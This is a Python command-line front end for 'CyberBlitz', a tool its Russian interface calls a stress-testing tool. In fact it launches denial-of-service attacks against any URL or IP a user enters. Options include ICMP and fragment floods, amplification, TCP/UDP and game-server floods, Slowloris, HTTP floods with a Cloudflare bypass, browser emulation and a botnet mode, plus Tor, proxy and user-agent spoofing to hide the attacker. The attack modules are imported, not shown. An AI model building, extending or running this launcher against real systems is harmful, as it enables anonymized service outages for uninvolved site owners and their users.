import asyncio
import logging
import time
import threading
import inspect
import click
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn

from config import update_config, CONFIG, setup_logging
from attacks.layer3 import ICMPFloodAttack, IPFragmentFloodAttack
from attacks.layer4 import AMPAttack, TCPAttack, UDPAttack, GameAttack, SpecialAttack, SlowLorisAttack
from attacks.layer7 import TLSAttack, HTTPAttack, BrowserAttack, get_locust_attack
from attacks.botnet import BotnetAttack
from utils.proxy import load_proxies_from_file
from utils.spoofing import load_user_agents_from_file
from gui_constants import ATTACK_METHODS, BROWSER_CONFIGS

console = Console()
logger = logging.getLogger(__name__)


def display_welcome():
    console.print(Panel("[bold green]Добро пожаловать в CyberBlitz![/bold green]\nМощный и удобный инструмент для стресс-тестирования.", title="[bold cyan]CyberBlitz TUI[/bold cyan]", border_style="green"))

def get_attack_parameters():
    target = Prompt.ask("[bold cyan]Введите цель (URL или IP)[/bold cyan]")
    port = IntPrompt.ask("[bold cyan]Введите порт[/bold cyan]", default=443 if 'https://' in target else 80)
    duration = IntPrompt.ask("[bold cyan]Длительность атаки (секунды)[/bold cyan]", default=10)
    threads = IntPrompt.ask("[bold cyan]Количество потоков[/bold cyan]", default=50)
    return target, port, duration, threads

def choose_attack_method():
    table = Table(title="[bold green]Доступные методы атак[/bold green]", show_header=True, header_style="bold magenta")
    table.add_column("Категория", style="cyan"); table.add_column("Метод", style="yellow"); table.add_column("Описание", style="white")
    table.add_section()
    table.add_row("[bold]Layer 7[/bold]", "HTTPS-BYPASS", "Продвинутый обход Cloudflare с помощью TLS-клиента")
    table.add_row("", "HTTP-BROWSER", "Эмуляция реального браузера (Playwright)")
    table.add_row("", "HTTPS-FLOODER", "Классический HTTPS-флуд")
    table.add_row("", "LOCUST", "Атака с использованием Locust")
    table.add_section()
    for category, methods in ATTACK_METHODS['L3'].items():
        table.add_row(f"[bold]Layer 3 - {category}[/bold]", ", ".join(methods))
    table.add_section()
    for category, methods in ATTACK_METHODS['L4'].items():
        table.add_row(f"[bold]Layer 4 - {category}[/bold]", ", ".join(methods))
    table.add_section()
    table.add_row("[bold]Botnet[/bold]", ", ".join(ATTACK_METHODS['L7']['BOTNET']))
    console.print(table)
    
    all_methods = ["HTTPS-BYPASS", "HTTP-BROWSER", "HTTPS-FLOODER", "LOCUST", *ATTACK_METHODS['L3']['FLOOD'], *ATTACK_METHODS['L4']['AMP'], *ATTACK_METHODS['L4']['TCP'], *ATTACK_METHODS['L4']['UDP'], *ATTACK_METHODS['L4']['GAME'], *ATTACK_METHODS['L4']['SPECIAL'], *ATTACK_METHODS['L7']['BOTNET']]
    return Prompt.ask("[bold cyan]Выберите метод атаки[/bold cyan]", choices=all_methods, default="HTTPS-BYPASS")

def get_advanced_options(method):
    options = {}
    if method == "HTTP-BROWSER":
        options['browser_type'] = 'playwright'
        options['behaviors'] = [b for b in ['clicks', 'scroll'] if Confirm.ask(f"[bold cyan]Эмулировать {b}?[/bold cyan]", default=True)]
    options['use_proxy'] = Confirm.ask("[bold cyan]Использовать прокси? (не рекомендуется с Tor)[/bold cyan]", default=False)
    if options['use_proxy']:
        options['proxy_file'] = Prompt.ask("[bold cyan]Путь к файлу с прокси[/bold cyan]", default="proxies.txt")
        options['proxy_type'] = Prompt.ask("[bold cyan]Тип прокси[/bold cyan]", choices=['http', 'https', 'socks4', 'socks5'], default='socks5')
    
    options['use_tor'] = Confirm.ask("[bold cyan]Использовать Tor? (требует запущенного Tor на порту 9050)[/bold cyan]", default=False)

    options['user_agent_source'] = Prompt.ask(
        "[bold cyan]Источник User-Agent'ов[/bold cyan]",
        choices=['generate', 'file'],
        default='generate'
    )
    if options['user_agent_source'] == 'file':
        options['user_agent_file'] = Prompt.ask("[bold cyan]Путь к файлу с User-Agent'ами[/bold cyan]", default="user_agents.txt")

    return options

def confirm_and_run(params, skip_confirm=False):
    summary_table = Table(title="[bold green]Параметры атаки[/bold green]", show_header=False)
    summary_table.add_column("Параметр", style="cyan"); summary_table.add_column("Значение", style="magenta")
    for key, value in params.items():
        summary_table.add_row(str(key).replace('_', ' ').title(), str(value))
    console.print(summary_table)

    if not skip_confirm and not Confirm.ask("[bold yellow]Начать атаку?[/bold yellow]", default=True):
        console.print("[bold red]Атака отменена.[/bold red]"); return

    if params['method'] == 'LOCUST':
        import gevent.monkey
        gevent.monkey.patch_all()

    # --- Config Update ---
    update_config(
        target_ip=params['target'], target_url=params['target'], port=params['port'], 
        threads=params['threads'], duration=params['duration'], 
        use_tor=params.get('use_tor', False), use_proxy=params.get('use_proxy', False), 
        browser_type=params.get('browser_type', 'none'), browser_behaviors=params.get('behaviors', [])
    )
    
    spoofing_opts = {}
    if params.get('user_agent_source') == 'file' and params.get('user_agent_file'):
        user_agents = load_user_agents_from_file(params['user_agent_file'])
        if user_agents:
            spoofing_opts['user_agent_source'] = 'file'
            CONFIG['user_agents_list'] = user_agents
    
    if spoofing_opts:
        CONFIG['spoofing'] = {**CONFIG.get('spoofing', {}), **spoofing_opts}

    if params.get('use_proxy') and params.get('proxy_file'):
        CONFIG['proxies'] = load_proxies_from_file(params['proxy_file'], params['proxy_type'])
        if not CONFIG['proxies']:
            console.print(f"[red]Ошибка: Не удалось загрузить прокси из файла {params['proxy_file']}.[/red]"); return
        console.print(f"[green]Загружено {len(CONFIG['proxies'])} прокси.[/green]")

    attack_map = {
        'HTTPS-BYPASS': lambda: TLSAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-BYPASS'),
        'HTTP-BROWSER': lambda: BrowserAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTP-BROWSER', browser_type='playwright', behaviors=CONFIG['browser_behaviors']),
        'HTTPS-FLOODER': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-FLOODER'),
        'LOCUST': lambda: get_locust_attack()(CONFIG['target_url'], CONFIG['duration'], 'LOCUST-HTTP'),
        'ICMP-FLOOD': lambda: ICMPFloodAttack(CONFIG['target_ip'], CONFIG['duration'], 'ICMP-FLOOD'),
        'IP-FRAGMENT-FLOOD': lambda: IPFragmentFloodAttack(CONFIG['target_ip'], CONFIG['duration'], 'IP-FRAGMENT-FLOOD'),
        **{m: (lambda m: lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration']))(m) for m in ATTACK_METHODS['L4']['AMP']},
        **{m: (lambda m: lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], m))(m) for m in ATTACK_METHODS['L4']['TCP']},
        **{m: (lambda m: lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], m))(m) for m in ATTACK_METHODS['L4']['UDP']},
        **{m: (lambda m: lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration']))(m) for m in ATTACK_METHODS['L4']['GAME']},
        **{m: (lambda m: lambda: SpecialAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], m))(m) for m in ATTACK_METHODS['L4']['SPECIAL']},
        'SLOWLORIS': lambda: SlowLorisAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], 'SLOWLORIS', num_sockets=CONFIG['threads']*2),
        **{m: (lambda m: lambda: BotnetAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration']))(m) for m in ATTACK_METHODS['L7']['BOTNET']},
    }
    attack_instance = attack_map[params['method']]()
    run_attack_with_progress(attack_instance, params)

def run_attack_with_progress(attack_instance, params):
    loop_holder = [None]  # Use a list to hold the loop reference across threads
    attack_finished_event = threading.Event()

    def attack_runner():
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop_holder[0] = loop  # Store the loop reference

            if asyncio.iscoroutinefunction(attack_instance.run):
                loop.run_until_complete(attack_instance.run())
            else:
                attack_instance.run()
        except BaseException:
            console.print("[bold red]\n--- КРИТИЧЕСКАЯ ОШИБКА В ПОТОКЕ АТАКИ ---[/bold red]")
            console.print_exception(show_locals=False)
        finally:
            if loop_holder[0]:
                # Gracefully shutdown all tasks on the loop before closing
                tasks = asyncio.all_tasks(loop=loop_holder[0])
                for task in tasks:
                    task.cancel()
                group = asyncio.gather(*tasks, return_exceptions=True)
                loop_holder[0].run_until_complete(group)
                loop_holder[0].close()
            attack_finished_event.set()

    attack_thread = threading.Thread(target=attack_runner)
    attack_thread.start()

    progress = Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TextColumn("({task.completed} из {task.total} сек)"), console=console)
    
    try:
        with Live(progress):
            task = progress.add_task(f"[cyan]Атака {params['method']}...", total=params['duration'])
            for _ in range(params['duration']):
                if not attack_thread.is_alive():
                    console.print("[bold red]Поток атаки неожиданно завершился. Смотрите ошибку выше.[/bold red]")
                    progress.update(task, description="[bold red]Атака провалена[/bold red]")
                    break
                time.sleep(1)
                progress.update(task, advance=1)
            else:
                progress.update(task, description=f"[green]Атака {params['method']} завершена.[/green]")
    except KeyboardInterrupt:
        console.print("[bold yellow]\nПерехвачено прерывание. Отправка сигнала остановки...[/bold yellow]")
    finally:
        console.print("[yellow]Отправка сигнала остановки...[/yellow]")
        loop = loop_holder[0]
        if hasattr(attack_instance, 'stop'):
            if inspect.iscoroutinefunction(attack_instance.stop):
                if loop and loop.is_running():
                    future = asyncio.run_coroutine_threadsafe(attack_instance.stop(), loop)
                    try:
                        future.result(timeout=5)
                    except asyncio.TimeoutError:
                        console.print("[bold red]Время ожидания остановки атаки истекло.[/bold red]")
                    except Exception as e:
                        console.print(f"[bold red]Ошибка при остановке атаки: {e}[/bold red]")
                else:
                    logger.warning("Event loop is not running. Cannot schedule stop coroutine.")
            else:
                # Fallback for truly synchronous stop methods
                try:
                    attack_instance.stop()
                except Exception as e:
                    console.print(f"[bold red]Ошибка при синхронной остановке атаки: {e}[/bold red]")

        # Wait for the thread to finish its cleanup
        attack_finished_event.wait(timeout=10)
        
        if attack_thread.is_alive():
            console.print("[bold red]Поток атаки не завершился вовремя.[/bold red]")

    console.print("[bold green]Атака полностью завершена. Метрики сохранены в папке 'logs'.[/bold green]")

@click.command()
@click.option('--target', help='Target URL or IP address.')
@click.option('--port', type=int, help='Target port.')
@click.option('--duration', type=int, help='Duration of the attack in seconds.')
@click.option('--threads', type=int, help='Number of attack threads.')
@click.option('--method', help='Attack method.')
@click.option('--use-proxy', is_flag=True, help='Enable proxy usage.')
@click.option('--proxy-file', help='Path to proxy file.')
@click.option('--proxy-type', type=click.Choice(['http', 'https', 'socks4', 'socks5']), help='Proxy type.')
@click.option('--use-tor', is_flag=True, help='Enable Tor for anonymization.')
@click.option('--user-agent-source', type=click.Choice(['generate', 'file']), default='generate', help="Source for User-Agents ('generate' or 'file').")
@click.option('--user-agent-file', help='Path to User-Agent file (if source is "file").')
@click.option('--browser-type', type=click.Choice(['playwright', 'selenium']), help='Browser type for L7 attacks.')
@click.option('--clicks', is_flag=True, help='Enable random clicks in browser-based attacks.')
@click.option('--scroll', is_flag=True, help='Enable random scrolling in browser-based attacks.')
@click.option('-y', '--yes', is_flag=True, help='Skip confirmation prompts.')
def cli(target, port, duration, threads, method, use_proxy, proxy_file, proxy_type, use_tor, user_agent_source, user_agent_file, browser_type, clicks, scroll, yes):
    """CyberBlitz - Advanced Stress Testing Tool"""
    params = {}
    run_interactive = not target or not method

    if run_interactive:
        # Interactive mode
        setup_logging(console=False)
        display_welcome()
        target, port, duration, threads = get_attack_parameters()
        method = choose_attack_method()
        params = {"target": target, "port": port, "duration": duration, "threads": threads, "method": method}
        advanced_opts = get_advanced_options(method)
        params.update(advanced_opts)
    else:
        # Command-line mode
        if not port:
            port = 443 if 'https://' in target else 80
        if not duration:
            duration = 10
        if not threads:
            threads = 50
            
        params = {
            "target": target, "port": port, "duration": duration, "threads": threads, "method": method,
            "use_proxy": use_proxy, "proxy_file": proxy_file, "proxy_type": proxy_type,
            "use_tor": use_tor, "browser_type": browser_type,
            "user_agent_source": user_agent_source, "user_agent_file": user_agent_file,
            "behaviors": [b for b, f in [('clicks', clicks), ('scroll', scroll)] if f]
        }

    try:
        confirm_and_run(params, skip_confirm=yes or run_interactive)
    except KeyboardInterrupt:
        console.print("\n[bold red]Программа прервана пользователем.[/bold red]")
    except Exception:
        console.print(f"\n[bold red]Произошла критическая ошибка в основном потоке:[/bold red]")
        console.print_exception(show_locals=True)


if __name__ == "__main__":
    cli()
